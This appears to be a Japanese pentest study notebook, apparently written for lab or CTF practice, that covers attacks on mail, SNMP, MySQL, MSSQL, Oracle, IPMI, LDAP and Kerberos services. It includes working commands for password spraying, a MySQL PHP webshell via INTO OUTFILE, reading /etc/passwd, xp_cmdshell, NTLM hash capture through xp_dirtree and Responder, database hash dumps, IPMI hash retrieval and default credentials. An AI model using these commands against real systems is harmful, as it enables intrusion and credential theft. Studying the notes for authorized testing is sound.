- OpenSSL - TLS暗号化インタラクションIMAP
```shell-session
openssl s_client -connect 10.129.14.128:imaps
```

接続の開始に成功し、ターゲット メール サーバーにログインすると、上記のコマンドを使用してサーバーを操作できる

#### Telnet
接続
```sh
telnet $Target_IP 110
```

**Telnet内で使用できるコマンド**
```sh
USER <Username>
PASS <Pawssword>
```
#### パスワード攻撃
```shell-session
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```
## クラウドメールサーバー
### メール列挙
Office 365とか、Gmail
Office 365用のツール
- [O365spray](https://github.com/0xZDH/o365spray)は、[ZDH](https://twitter.com/0xzdh)が開発したMicrosoft Office 365（O365）を対象としたユーザー名列挙およびパスワードスプレーツール

ターゲットドメインがOffice 365を使用しているかどうかを検証
```sh
 python3 o365spray.py --validate --domain <メールドメイン>
```

ユーザー列挙
```shell-session
python3 o365spray.py --enum -U users.txt --domain <メールドメイン>
```

### パスワード攻撃
```shell-session
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```


## SNMP
- SNMP（Simple Network Management Protocol）
- **UDPスキャンじゃないと見つからない！！！**
- ネットワーク機器（ルーター、スイッチ、サーバーなど）の状態を監視・管理するためのプロトコル。ネットワーク管理者がデバイスの情報を取得したり、設定を変更したりするのに使う
- `public`と`private`のメーカーのデフォルトのコミュニティ文字列は、多くの場合、変更されない
- SNMP バージョン 1 と 2c  : 名前がわかっていれば、アクセスできる。
- SNMPのバージョン
	- v1 → 最も古い（認証はIPアドレスベース）
		- 通信は暗号化されていない
	- v2c → よく使われる（コミュニティストリングによる認証）
		- コミュニティストリングス
			- 要求された情報を表示するかどうかのパスワード
	- v3 → セキュリティ強化版（認証と暗号化あり）
MIB（Management Information Base）について
- 異なるベンダーやクライアント―サーバー環境でSNMPアクセスを共通化するために作られた
- 機器情報を保存する独立したフォーマット
- SNMPで問い合わせ可能なオブジェクトが、標準化されたツリー階層構造で一覧化されているテキストファイル
- 少なくとも1つ以上の「OID（オブジェクト識別子）」を含み、各オブジェクトのユニークなアドレスや名前、型、アクセス権、説明などを定義
- ASN.1に準拠したASCIIテキスト形式で記述されている
- MIB自体にはデータを格納せず、「どの情報がどこにあるか」「OIDの返す値は何か」「どのデータ型が使われるか」などを示す役割を持つ

OID（Object Identifier）について
- 階層型の名前空間におけるノードを表す
- 数字の並びでノードを一意に識別し、ツリー上の位置を特定できる
- 数字の連なりが長いほど、より詳細な情報を指す
- 多くの上位ノードは下位ノードへの参照のみを含む
- 通常、整数をドット（.）で区切った表記で表される
- 関連するOIDに対する多くのMIBは、Object Identifier Registryなどで参照できる

### デフォルト設定の把握
ここに書いてある
```shell-session
cat /etc/snmp/snmpd.conf | grep -v "#" | sed -r '/^\s*$/d'
```

### 危険な設定
| コマンド                                           | 説明                                     |
| :--------------------------------------------- | :------------------------------------- |
| rwuser noauth                                  | 認証なしでOIDツリー全体にアクセスを許可する                |
| rwcommunity [community string] [IPv4 address]  | リクエスト元に関係なく、OIDツリー全体へのアクセスを許可する        |
| rwcommunity6 [community string] [IPv6 address] | IPv6を使用する点を除き、rwcommunityと同等のアクセスを許可する |


### 情報収集のコマンド
- SNMPのフットプリンティングを行う際には、**snmpwalk**・**onesixtyone**・**braa**などのツールが利用できる。
- コミュニティストリングは任意の送信元に紐づけられる可能性があるため、実際に存在するコミュニティストリングを突き止めるには時間がかかることがある。

- **snmpwalk**は、OIDおよびその情報を問い合わせるためのツール。
```shell-session
snmpwalk -v2c -c public 10.129.14.128
```

- **onesixtyone**は、コミュニティストリング（管理者が任意で設定可能）の名称をブルートフォースで特定するためのツール。
```shell-session
sudo apt install onesixtyone
onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128
```

- コミュニティストリングの推測のヒント:
	- SNMPコミュニティ文字列は、管理者の任意でかなり自由に名前を付けられるから、以下のような問題と特徴がありそう
		- IPアドレスごとにホストのホスト名を使ってコミュニティ文字列を付ける場合
		    - 「host1」「serverA」などの分かりやすい名称だけでなく、記号や独自の略称を含む場合もあるため、簡単には推測できない。
	- 大規模ネットワークではパターンがある可能
	    - もしSNMPで管理されているサーバーが100台以上あるような大規模環境では、コミュニティ文字列の名前付けに何らかの規則性（例：「server01」「server02」… のような連番）がある場合が多い。
	    - こうしたパターンを利用して推測することが可能。
	- カスタムワードリストを作成する方法
	    - 「crunch」などのツールを使えば、推測に使うワードリストを自分で作成できる。
	    - このようなワードリストの作成は、複数の命名パターンを総当たりする際に役立つ。

コミュニティ文字列がわかったら、[braa](https://github.com/mteg/braa) と一緒に使用して、個々の OID をブルートフォースし、その背後にある情報を列挙できる
既に判明しているコミュニティ文字列を使って、braaコマンドで特定のOID（ここでは.1.3.6.[*]以下のツリー）を総当たりし、そこにぶら下がっている情報を列挙するコマンド
```shell-session
sudo apt install braa
braa <community string>@$Target_IP:.1.3.6.*
braa public@10.129.14.128:.1.3.6.*
```

10.129.42.253 のホスト名を SNMP で取得する
```
snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
```
- snmpwalk → SNMPエージェント（デバイス）に問い合わせて、階層的なデータを取得するコマンド
- -v 2c → SNMPのバージョン2cを使用
- -c public → コミュニティストリング（パスワードみたいなもの）が "public"
- 10.129.42.253 → SNMPエージェント（対象デバイス）のIPアドレス
- 1.3.6.1.2.1.1.5.0 → OID（オブジェクト識別子）（取得したいデータを指定）
	- OID（Object Identifier）は、SNMPで取得できる情報の「アドレス」みたいなもの。
	- 1.3.6.1.2.1.1.5.0 → デバイスのホスト名（sysName）
	- 1.3.6.1.2.1.1.1.0 → デバイスの説明（sysDescr）
	- 1.3.6.1.2.1.2.2.1.2 → インターフェース一覧（ifDescr）

[onesixtyone](https://github.com/trailofbits/onesixtyone)などのツールを使用する`dict.txt`と、ツールの GitHub リポジトリに含まれているファイルなどの一般的なコミュニティ文字列の辞書ファイルを使用して、コミュニティ文字列名をブルート フォース攻撃できる
```shell-session
onesixtyone -c dict.txt 10.129.42.254
```

## MySQL
- CMS WordPress です。WordPressは、作成されたすべての投稿、ユーザー名、およびパスワードを独自のデータベースに保存したりしてる
- MySQLは、効率的な構文と高い応答速度が不可欠な`dynamic websites`などのアプリケーションに最適
- メジャーな組み合わせとして
	- [LAMP](https://en.wikipedia.org/wiki/LAMP_\(software_bundle\))（Linux、Apache、MySQL、PHP）
	- [LEMP](https://lemp.io/)(Linux、Nginx、MySQL、PHP)
	- がある。
- MySQLデータベースを備えたWebホスティングでは、これはPHPスクリプトに必要なコンテンツが保存される

### デフォルト設定
```shell-session
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'
```

### 危険な設定
- 入力はプレーンテキストで作成されているため、`user`、`password`、および`admin_address`の設定はセキュリティに関連している。
- 多くの場合、MySQLサーバーの設定ファイルの権限が正しく割り当てられていない
- ファイルやシェルを読み取る別の方法があれば、MySQLサーバーのファイルとユーザー名とパスワードを見ることができる
- `debug`と`sql_warnings`の設定は、エラーが発生した場合に冗長な情報を出力して、攻撃のヒントをくれる

| **設定**               | **説明**                                              |
| :------------------- | :-------------------------------------------------- |
| **user**             | MySQLサービスをどのユーザー権限で動作させるかを設定します。                    |
| **password**         | MySQLユーザーのパスワードを設定します。                              |
| **admin_address**    | 管理用ネットワークインターフェースでTCP/IP接続を受け付けるIPアドレスを指定します。       |
| **debug**            | 現在のデバッグ設定を示す変数です。                                   |
| **sql_warnings**     | 単一行のINSERTステートメントで警告が発生した場合、その情報文字列を出力するかどうかを制御します。 |
| **secure_file_priv** | データのインポートおよびエクスポート操作の影響範囲を制限するために使用する変数です。          |

### 情報収集(コマンド)

```shell-session
sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
```
すべてのスキャンと同様に、一部の情報が偽陽性であることが判明する可能性があるため、結果に注意し、得られた情報を手動で確認する必要がある

MySQLとの接続
```shell-session
mysql -u root -h 10.129.14.132
```

```shell-session
mysql -u root -pP4SSw0rd -h 10.129.14.128
```

このコマンド打って、この表示になったらローカルファイル読み込めたり、悪意のあるスクリプトを設置することできる
```shell-session
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```


SELECT INTO OUTFILE を利用して Webサーバー上にwebshellを設置し、RCEするコマンド
- **ブラウザ or curl で http://<ターゲットIP>/shell.php?cmd=id を実行すると、RCEが取れる！**
```sh
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```

MySQLのローカルファイル読み取り
```sh
SELECT LOAD_FILE("/etc/passwd");
```



MySQLの中でよく使うコマンド

| **コマンド**                                             | **説明**                                              |
| ---------------------------------------------------- | --------------------------------------------------- |
| `mysql -u <user> -p<password> -h <IP address>`       | MySQLサーバーに接続します。「-p」フラグとパスワードの間にスペースがあって**はいけません**。 |
| `show databases;`                                    | すべてのデータベースを表示します。                                   |
| `use <database>;`                                    | 既存のデータベースの1つを選択します。                                 |
| `show tables;`                                       | 選択したデータベースで利用可能なすべてのテーブルを表示します。                     |
| `show columns from <table>;`                         | 選択したデータベースのすべての列を表示します。                             |
| `select * from <table>;`                             | 目的のテーブルにすべてを表示します。                                  |
| `select * from <table> where <column> = "<string>";` | 目的のテーブルで必要な`string`を検索します。                          |



## MSSQL
- Microsoft SQL (MSSQL) は、Microsoft の SQL ベースのリレーショナル データベース管理システム
- 最後のセクションで説明した MySQL とは異なり、MSSQL はクローズド ソースであり、当初は Windows オペレーティングシステムで実行するように書かれていた
- Windows を実行しているターゲットで MSSQL インスタンスに出くわす可能性が高くなる
- SQL Server Management Studio (SSMS) は、MSSQL インストール パッケージと一緒にインストールすることも、別途ダウンロードしてインストールできる機能として提供される
- SSMSはクライアント側のアプリケーションであるため、管理者または開発者がデータベースの管理を計画している任意のシステムにインストールして使用できる
- これだけじゃないけど、これらはMSSQLで使われる
	- mssql-cli, 　SQL Server PowerShell,　 HeidiSQL,　 SQLPro,　 Impacket's mssqlclient.py
```shell-session
locate mssqlclient
```

| デフォルトシステムデータベース | 説明                                                                            |
| --------------- | ----------------------------------------------------------------------------- |
| master          | SQL Server インスタンスに関するすべてのシステム情報を管理します                                         |
| model           | 新しいデータベースのテンプレートとなるデータベースです。model データベースでの設定変更は、その後に作成されるすべての新しいデータベースに反映されます |
| msdb            | SQL Server Agent がジョブやアラートをスケジュールするために使用します                                   |
| tempdb          | 一時オブジェクトを格納するためのデータベースです                                                      |
| resource        | SQL Server に含まれるシステムオブジェクトが格納されている読み取り専用のデータベースです                             |

### デフォルト設定
- 管理者が最初にMSSQLをネットワークアクセス可能にインストールして構成すると、SQLサービスは`NT SERVICE\MSSQLSERVER`として実行される
- クライアント側から接続することは、Windows認証を介して可能であり、デフォルトでは、接続を試みるときに暗号化は強制されない
- Windows Authentication による認証  
	- データベース管理システムへの接続を許可する前に、基盤となる Windows OS がログイン要求を処理する
	- その時、ローカル SAM データベースまたはドメイン コントローラー（Active Directory）を使用する
- Active Directory を利用するメリットとリスク
	- Windows 環境でのアクティビティ監査やアクセス制御に最適
	- しかし、アカウントが侵害されると、Windows ドメイン環境全体で特権の昇格や横方向の移動につながる可能性がある
- VM での設定と理解
	- どの OS、サービス、サーバー役割、アプリケーションでも同様ですが、インストールから構成までを VM 上で行うことが推奨されます。 
	- すべてのデフォルト構成や、管理者が起こし得る誤設定を把握するのに役立ちます。  


### 危険な設定
- MSSQL クライアントが MSSQL サーバーへ接続する際に暗号化を使用していない
- 暗号化を使用する場合の自己署名証明書の利用
	- 自己署名証明書は偽造される可能性がある
- 名前付きパイプの使用
	-  Windows 環境で用いられる プロセス間通信 (Inter-Process Communication: IPC) の仕組みの一つ
	- プロセス間通信を行うための「名前付き通信経路」のこと
- 弱い、またはデフォルトの sa 資格情報
	- 管理者がこのアカウントを無効化し忘れている可能性がある
- 匿名アクセスが有効になっている
- パスワードなしのユーザーが存在する
- すべてのユーザー、グループ、またはマシンがアクセス可能になっている


### 情報収集(コマンド)

- nmapでのスキャン
```shell-session
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $Target_IP
```

- Metasploitでのスキャン
```shell-session
scanner/mssql/mssql_ping
```

- Mssqlclient.pyとの接続
	- 推測したり、資格情報にアクセスしたりできる場合、MSSQLサーバーにリモートで接続し、T-SQL（Transact-SQL）を使用してデータベースとの対話を開始できる
```shell-session
wget https://raw.githubusercontent.com/fortra/impacket/refs/heads/master/examples/mssqlclient.py
mssqlclient.py Administrator@10.129.201.248 -windows-auth
```

```sh
mssqlclient.py Administrator@10.129.201.248
```
- MSSQLでは、xp_cmdshell という拡張ストアドプロシージャを使用して、OS上でコマンドを実行することが可能
	- xp_cmdshell は **デフォルトでは無効化** されているので、有効化しないとダメ
有効化
```sh
SQL> enable_xp_cmdshell
```

whoamiコマンドの実行
```sh
xp_cmdshell whoami
```

- MSSQLのローカルファイル読み取り
```sh
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents;
```

MSSQLの xp_dirtree や xp_subdirs を利用することで、SQL Serverのサービスアカウントのハッシュを取得
- NTLMv2のハッシュが取得 でき、クラックまたはリレー攻撃に利用できる
```sh
EXEC master..xp_dirtree '\\10.10.110.17\share\';
```

`sys.sql_logins` からハッシュを取得
- MSSQL では、ユーザーのパスワードハッシュが sys.sql_logins に格納されていることがある
- このテーブルを照会して mssqlsvc のハッシュを取得してみる
```sh
SELECT name, password_hash FROM master.sys.sql_logins;
```

現在のユーザーがアクセスできるデータベースを調べる
```sh
SELECT name, HAS_DBACCESS(name) AS has_access FROM sys.databases;
```
#### ブルートフォース
```sh
hydra -l julio -P /usr/share/wordlists/rockyou.txt mssql://10.129.203.7
```

#### NTLMハッシュを取得・特権昇格
一回ログインしてから、ローカルで試す方法もある
**ログイン**
**NTLM ハッシュをキャプチャ**
- MSSQL の xp_dirtree を利用して NTLM ハッシュを Responder に送信。
- 攻撃元でのResponder のセットアップ
```sh
sudo responder -I tun0
```

**MSSQL で xp_dirtree を実行**
```sh
EXEC master..xp_dirtree '\\<攻撃元のIP>\share';
GO
```

**Responder でハッシュを取得・クラック**
```sh
echo "取得したNTLM" > hash.txt
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
```

**クラックしたアカウントでMSSQL にログイン**
sqlcmd を使う場合
```sh
sqlcmd -S 10.129.133.207 -U mssqlsvc -P 'クラックしたパスワード'
```

mssqlclient.py を使う場合
```sh
python3 /usr/local/bin/mssqlclient.py mssqlsvc@10.129.133.207 -windows-auth
```

## Oracle TNS
- Oracle Transparent Network Substrate (TNS) サーバーは、Oracle データベースとネットワーク上のアプリケーション間の通信を容易にする通信プロトコル
- IPX/SPXやTCP/IPプロトコルスタックなど、Oracleデータベースとクライアントアプリケーション間のさまざまなネットワークプロトコルをサポートしている

### デフォルト設定
- デフォルトポート
    - リスナーは通常 TCP/1521 ポートで待ち受け (設定変更可能)
- サポートされるプロトコル・インターフェイス
    - TCP/IP, UDP, IPX/SPX, AppleTalk をサポート
    - 複数インターフェイスや特定 IP アドレスでの待ち受けも可能
- バージョン別のリモート管理可否
    - Oracle 8i/9i: リモート管理がデフォルトで有効
    - Oracle 10g/11g: リモート管理はデフォルトで無効
- 基本的なセキュリティ機能
    - 許可されたホストのみ接続を受理
    - ホスト名・IP アドレス・ユーザー名とパスワードの組み合わせによる認証
    - Oracle Net Services によるクライアント/サーバー間通信の暗号化
- 設定ファイル
    - `tnsnames.ora` と `listener.ora`
    - 通常 `$ORACLE_HOME/network/admin` ディレクトリに配置
    - tnsnames.oraファイル
	    - クライアント側のOracle Net Servicesソフトウェアを使用してサービス名をネットワークアドレスに解決する
	- listener.oraファイル
	    - リスナーすべきサービスとリスナーの動作を決定
- Oracle TNS と連携するサービス
    - Oracle DBSNMP, Oracle データベース, Oracle Application Server, Oracle Enterprise Manager, Oracle Fusion Middleware, Web サーバーなど
- デフォルトインストール時の注意点
    - Oracle 9: デフォルトパスワード「CHANGE_ON_INSTALL」
    - Oracle 10: デフォルトパスワード設定なし
    - Oracle DBSNMP: デフォルトパスワード「dbsnmp」
    - 一部組織では未だに finger サービスと併用しており、脆弱性が高まる可能性
- tnsnames.ora ファイルのエントリ構成
    - 各データベース・サービスごとに固有エントリを定義
    - 名前、ネットワーク上の所在地、サービス/データベース名などを記載
    - ORCLと呼ばれるサービスを発見できる
	    - IPアドレス10.129.11.102のポートTCP/1521でリッスンしている
	    - クライアントは、サービスに接続するときにサービス名`orcl`を使用する必要がある
	    - ただし、tnsnames.oraファイルには、さまざまなデータベースやサービス用のそのようなエントリが多数含まれている場合がある
	    - エントリには、認証の詳細、接続プール設定、ロードバランシング構成などの追加情報も含めることができる
- ブラックリストとしての機能
	- PL/SQL除外リスト（`PlsqlExclusionList`）を使用することで保護
	- `$ORACLE_HOME/sqldeveloper`ディレクトリに配置する必要があるユーザー作成のテキストファイル
    - Oracle Application Server を通じてはアクセスできない“ブラックリスト”として機能する。

| **設定**                 | **説明**                                           |
| ---------------------- | ------------------------------------------------ |
| **DESCRIPTION**        | データベースの名前と接続タイプを指定する記述子。                         |
| **ADDRESS**            | データベースのネットワークアドレス（ホスト名とポート番号を含む）。                |
| **PROTOCOL**           | サーバーとの通信に使用されるネットワークプロトコル。                       |
| **PORT**               | サーバーとの通信に使用されるポート番号。                             |
| **CONNECT_DATA**       | 接続の属性を指定（サービス名・SID・プロトコル・データベースインスタンス識別子など）。     |
| **INSTANCE_NAME**      | クライアントが接続したいデータベースインスタンスの名前。                     |
| **SERVICE_NAME**       | クライアントが接続したいサービスの名前。                             |
| **SERVER**             | データベース接続に使用されるサーバーのタイプ（例: dedicated, shared など）。 |
| **USER**               | データベースサーバーに認証するためのユーザー名。                         |
| **PASSWORD**           | データベースサーバーに認証するためのパスワード。                         |
| **SECURITY**           | 接続のセキュリティタイプ（SSL/TLS など）。                        |
| **VALIDATE_CERT**      | SSL/TLS を使用して証明書を検証するかどうか。                       |
| **SSL_VERSION**        | 接続で使用する SSL/TLS のバージョン。                          |
| **CONNECT_TIMEOUT**    | クライアントがデータベースへの接続を確立するための制限時間（秒）。                |
| **RECEIVE_TIMEOUT**    | クライアントがデータベースから応答を受け取るための制限時間（秒）。                |
| **SEND_TIMEOUT**       | クライアントがデータベースへリクエストを送信するための制限時間（秒）。              |
| **SQLNET.EXPIRE_TIME** | クライアントが接続障害を検知するための制限時間（秒）。                      |
| **TRACE_LEVEL**        | データベース接続のトレースレベル。                                |
| **TRACE_DIRECTORY**    | トレースファイルが保存されるディレクトリ。                            |
| **TRACE_FILE_NAME**    | トレースファイルの名前。                                     |
| **LOG_FILE**           | ログ情報が保存されるファイル。                                  |

### 情報収集(コマンド)
- TNSリスナーを列挙して対話する前に、Pwnboxインスタンス用にいくつかのパッケージとツールをダウンロードする必要がある
- 以下を`prepare.sh`として保存
```bash
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
cd odat/instantclient_21_12
export LD_LIBRARY_PATH="$(pwd):$LD_LIBRARY_PATH"
```
実行できたかは、以下のコマンドでわかる
- Python で書かれたオープンソースの侵入テスト ツールで、Oracle データベースの脆弱性を列挙して悪用するように設計されている
- SQLインジェクション、リモートコード実行、特権エスカレーションなど、Oracleデータベースのさまざまなセキュリティ欠陥を特定して悪用するために使用できる
```shell-session
 ./odat.py -h
```

- Nmap
```shell-session
sudo nmap -p1521 -sV $Target_IP --open
```

#### SIDのブルートフォース
- Oracle　RDBMSだとSIDっていうデータベースインスタンスIDが分からなければどうしようもないから何としても見つける
- Nmapの例
```shell-session
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```
- odat.pyを使った時
```shell-session
./odat.py all -s 10.129.204.235
```

 #### ログイン
 - XEは、SIDね
	 - ユーザー名/パスワード@IP/SID
	 - **scott/tigerっていう認証情報は、デフォルトの認証情報で、CTFとかだと放置されがち。**
	 - **なので、まずは一旦この認証情報で試してみる！！！**
```shell-session
sqlplus scott/tiger@$Target_IP/<ブルートフォースしたSID>
```
- 次のエラーに遭遇した場合 sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory。以下を実行
```shell-session
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```


#### データベース列挙
- データベースを手動で列挙するために使用できる多くの[SQLplusコマンド](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985)がある。
- たとえば、現在のデータベースで利用可能なすべてのテーブルを一覧表示したり、現在のユーザーの権限を次のように表示したりできる

```shell-session
sqlplus scott/tiger@$Target_IP/XE
```

sysdbaでのログイン
- ログインしたユーザーが、管理権限を持っていなくても、そのユーザーアカウントを使い、sysdba（System Database Admin）としてログインを試すことができる。
	- これは、データベース管理者によって ユーザーに適切な権限を与えられている場合、または管理者自身が利用する場合に可能となる。
```shell-session
sqlplus scott/tiger@$Target_IP/XE as sysdba
```

#### 操作
- オラクルのデータベースにアクセスすると、さまざまなアプローチ取れる
- 私たちが持っている情報とセットアップ全体に大きく依存する
- 新規ユーザーの追加や変更はできない

`sys.user$`からパスワードハッシュを取得し、オフラインで解読しようと試みるコマンド
```shell-session
select name, password from sys.user$;
```

別のオプションは、ターゲットにWebシェルをアップロードすること
- これにはサーバーがWebサーバーを実行する必要があり、Webサーバーのルートディレクトリの正確な場所を知る必要がある
	- Linux : `/var/www/html`
	- Windows : `C:\inetpub\wwwroot`
- ウイルス対策や侵入検知/防止システムにとって危険に見えないファイルで悪用アプローチを試すことは常に重要
	- 文字列でテキストファイルを作成し、それを使用してターゲットシステムにアップロードできる
```shell-session
echo "Oracle File Upload Test" > testing.txt
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

ファイルアップロードが正しくできているかを判断する
```shell-session
curl -X GET http://10.129.204.235/testing.txt
```



## IPMI
- [インテリジェントプラットフォーム管理インターフェイス](https://www.thomas-krenn.com/en/wiki/IPMI_Basics)（`IPMI`）は、システム管理と監視に使用されるハードウェアベースのホスト管理システムの標準化された仕様のセット
	- なんかIPMI専用のチップがあるサーバーでできるらしい
	- だから完全にサーバーを管理するサーバーって感じだね
	- 自律的なサブシステムとして機能し、ホストのBIOS、CPU、ファームウェア、および基盤となるオペレーティングシステムとは独立して動作する
	- IPMI プロトコルは 1998 年に Intel によって最初にリリースされ、現在、Cisco、Dell、HP、Supermicro、Intel など、200 以上のシステム ベンダーによってサポートされている
	- IPMIバージョン2.0を使用するシステムは、シリアルオーバーLANを介して管理できるため、システム管理者はシリアルコンソール出力をバンドで表示できる
	- IPMIが機能するためには、次のコンポーネントが必要
		- ベースボード管理コントローラ（BMC）-マイクロコントローラとIPMIの必須コンポーネント
		- インテリジェントシャーシ管理バス（ICMB）-あるシャーシから別のシャーシへの通信を可能にするインターフェース
		- インテリジェントプラットフォーム管理バス（IPMB）-BMCを拡張する
		- IPMIメモリ - システムイベントログ、リポジトリストアデータなどを保存します。
		- 通信インターフェース - ローカルシステムインターフェース、シリアルおよびLANインターフェース、ICMBおよびPCI管理バス
	- 内部ペネトレーションテストでの注意点
		- IPMI を見落とさないことが重要（多くの環境で脆弱性が見つかっている）。
		- BMC の Web コンソールにアクセス可能になるケースは高リスクにつながる。
		- 環境によっては、解読可能だが一応ユニークなパスワードを設定し、それを他のシステムでも再利用している事例がある。
		- 実際のペネトレーションテストでは、IPMI ハッシュを入手してオフラインで Hashcat により解読し、root ユーザとして複数の重要サーバに SSH 接続できたり、各種ネットワーク監視ツールの Web 管理コンソールにもアクセスできた例がある。

### 情報収集(コマンド)
- IPMIはポート623 UDPを介して通信する
- IPMIプロトコルを使用するシステムは、ベースボード管理コントローラ（BMC）
- BMCは通常、Linuxを実行する組み込みARMシステムとして実装され、ホストのマザーボードに直接接続される
- 内部侵入テストでよく見られる最も一般的なBMCは、HP iLO、Dell DRAC、およびSupermicro IPMIである。
- 評価中にBMCにアクセスできれば、ホストのマザーボードに完全にアクセスでき、ホストオペレーティングシステムの監視、再起動、電源オフ、または再インストールもできる
- BMCへのアクセスを得ることは、システムへの物理的なアクセスとほぼ同じ
	- 激アツ！！！！
	- 多くのBMC（HP iLO、Dell DRAC、Supermicro IPMIを含む）
		- Webベースの管理コンソール、TelnetやSSHなどのコマンドラインリモートアクセスプロトコル、およびIPMIネットワークプロトコル用のポート623 UDPを公開している

#### スキャン
- Nmap
	- UDPであることに注意！！！
- 末尾のホスト名を探さないといけないから、Metasploitの方がやりやすいかも
```shell-session
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```

- Metasploit
```shell-session
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
```

#### ログイン
デフォルトの認証情報でログインできる場合
- 内部侵入テストでは、管理者がデフォルトのパスワードを変更していないBMCがよく見つかる
- それぞれのデフォルトパスワード
	- あと、IPMSがこれでログインできたら、他のsshとかもこれでログインできる可能性あるから試す。

| Product         | Username      | Password                                                                  |
| --------------- | ------------- | ------------------------------------------------------------------------- |
| Dell iDRAC      | root          | calvin                                                                    |
| HP iLO          | Administrator | randomized 8-character string consisting of numbers and uppercase letters |
| Supermicro IPMI | ADMIN         | ADMIN                                                                     |

デフォルトの認証情報でログインできない場合
- IPMI 2.0 の RAKP プロトコルに存在する脆弱性を利用できる
	- IPMIは、認証プロセス中に、サーバがユーザのパスワード（ソルト付きの SHA1 または MD5 ハッシュ）を認証前にクライアントへ送信する。
	- この仕組みを悪用すると、BMC 上の「有効な任意のユーザアカウント」のパスワードハッシュを取得できる。
	- 取得したパスワードハッシュは、Hashcat（モード 7300）を使った辞書攻撃でオフライン解析が可能。
	- この脆弱性は修正されない
		- この問題は IPMI 仕様の根幹部分に起因するため、直接的な“修正”は行えない。
		- 対策としては、極めて長く解読が困難なパスワードを設定するか、BMC への直接アクセスをネットワークセグメンテーションで制限することなどが考えられる。
	- HP iLO で工場出荷時のデフォルトパスワードを使っているケース
		- 8文字の大文字と数字の組み合わせを総当たりする際、以下のコマンド（マスク攻撃）などが有効↓
```sh
echo 'HASH' > ipmi.txt

hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

IPMI ハッシュを取得するには、Metasploit [IPMI 2.0 RAKP Remote SHA1 パスワード ハッシュ検索](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/)モジュールを使用できる
```shell-session
use auxiliary/scanner/ipmi/ipmi_dumphashes 
```

なんかうまく行かない時は、このツールも使えるらしい
https://github.com/c0rnf13ld/ipmiPwner
- 準備
```sh
sudo apt-get update
sudo apt-get install ipmitool -y
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

```

- 実行
```sh
python3 ipmipwner.py --host 192.168.1.12 -uW /home/user/User.txt -c john -pW /usr/share/wordlists/rockyou.txt -oH ipmi_hash
```


認証情報わかったら、
以下の2つでログインできる
 - Webコンソール
	- iLO/BMC の IPアドレス (またはホスト名) をブラウザに入力
	    例: `https://<BMCのIPアドレス>/`  
	    HP iLO の場合は、`https://<iLO IP or hostname>/` など。
	- ログイン画面が表示されたら、ユーザー名 (ID) とパスワードを入力
	- ログイン後、サーバのリモート管理や電源操作、設定確認などが可能
	    - GUI ベースの操作が中心です。
 - CLIツール
	 - ipmitool
```sh
sudo apt-get update
sudo apt-get install ipmitool
```

```sh
ipmitool -I lanplus -H <BMCのIPアドレス> -U <ユーザー名> -P <パスワード> chassis power status
```

## LDAP
- ポート88（Kerberos）、389（LDAP）、445（SMB）、3268（Global Catalog）などが開いている→このホストはActive Directoryのドメインコントローラーであると推定可能

1. 匿名ログインできるか
2. Kerberoasへの攻撃に繋げられるようなアカウント名・認証情報を探す

匿名ログイン
```sh
ldapsearch -x -H ldap://172.16.2.5 -s base
```

```sh
ldapdomaindump ldap://10.129.154.18 --no-json -d fluffy.htb
```
## Kerberos
1. まずユーザーを特定する
	- ユーザーの辞書などあれば、Kerbrute使って、ユーザーを特定する
	- [[Pentest_Technique/Active Directory#Kerbrute を使った内部ADユーザーブルートフォース]]
2. AS-REPが設定されてるアカウントはないか
	- [[Pentest_Technique/Active Directory#ASREPRoasting (事前認証なしKerberosアカウントの攻撃)]]
	- 認証情報いらない
		- ユーザー名だけでできる
3. SPNが設定されてるアカウントはないか 
	-  認証情報が必要
		- ユーザー名とパスワード
	- [[Pentest_Technique/Active Directory#GetUserSPNs.py]]

spnが有効 kerberoasroasting
pre authentication が無効 as rep roasting


## IIS
Microsoft IIS httpd 10.0

# 脆弱性の探索

## 脆弱性スキャナー
